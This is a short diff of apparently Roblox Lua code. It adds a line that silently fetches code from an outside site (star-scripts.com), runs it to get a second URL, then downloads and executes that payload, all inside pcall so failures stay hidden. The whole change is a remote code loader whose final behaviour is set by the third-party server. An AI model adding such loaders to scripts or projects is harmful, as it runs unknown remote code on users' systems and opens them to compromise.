@@ -1,6 +1,6 @@
 task.spawn(function()
     pcall(function()
-       loadstring(game:HttpGet())()
+       loadstring(game:HttpGet(loadstring(game:HttpGet("https://star-scripts.com/api/run/v8Q_CMtqfUHMihHW4ZzidEAUgBB7R9MT"))()))()
     end)
 end)
  
